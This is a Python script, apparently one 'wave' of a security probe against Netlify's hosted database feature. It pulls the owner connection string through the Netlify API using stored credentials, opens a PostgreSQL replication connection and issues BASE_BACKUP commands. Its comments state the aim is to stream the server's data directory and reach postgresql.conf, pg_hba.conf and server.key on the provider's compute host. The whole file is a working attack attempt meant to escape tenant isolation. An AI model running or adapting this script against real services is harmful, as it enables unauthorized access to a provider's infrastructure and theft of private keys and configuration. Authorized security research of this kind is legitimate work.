# -*- coding: utf-8 -*-
"""database-query 波10:复制协议 BASE_BACKUP 尝试(replication 已通 -> 数据目录流)
若成功:postgresql.conf / pg_hba.conf / server.key 等 compute 文件系统可达
"""
import sys, os, json, re, http.client, ssl
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import AUTH_HEADER

SITE_ID = '04f08ff6-f274-47ac-b6d7-5fb1e055f3b4'
ctx = ssl.create_default_context()

conn = http.client.HTTPSConnection('api.netlify.com', context=ctx, timeout=30)
conn.request('GET', '/api/v1/sites/%s/database' % SITE_ID, headers={'Authorization': AUTH_HEADER, 'Accept': 'application/json'})
r = conn.getresponse()
d = json.loads(r.read().decode('utf-8', 'replace'))
conn.close()
cs = d.get('connection_strings', {}).get('netlifydb_owner', '')
m = re.search(r'postgresql://netlifydb_owner:([^@]+)@([^/]+)/(\w+)', cs)
PW, HOST, DB = m.group(1), m.group(2), m.group(3)

import psycopg
c = psycopg.connect(host=HOST, port=5432, dbname=DB, user='netlifydb_owner', password=PW,
                    sslmode='require', connect_timeout=10, replication='database', autocommit=True)
print('replication conn OK')

# B1: BASE_BACKUP(数据目录流)
try:
    cur = c.execute("BASE_BACKUP LABEL 'probe_bb'")
    print('B1 BASE_BACKUP execute returned:', type(cur))
    try:
        rows = cur.fetchall()
        print('B1 rows:', str(rows)[:300])
    except Exception as e2:
        print('B1 fetch ERR:', str(e2)[:200])
except Exception as e:
    print('B1 BASE_BACKUP ERR:', str(e)[:300])

# B2: 尝试通过 copy 对象读
try:
    with c.cursor() as cur:
        cur.execute("BASE_BACKUP LABEL 'probe_bb2'")
        if cur.copy is not None:
            print('B2 copy available, reading...')
            data = cur.copy.read(200)
            print('B2 data head:', data[:200])
        else:
            print('B2 no copy obj')
except Exception as e:
    print('B2 ERR:', str(e)[:300])

c.close()
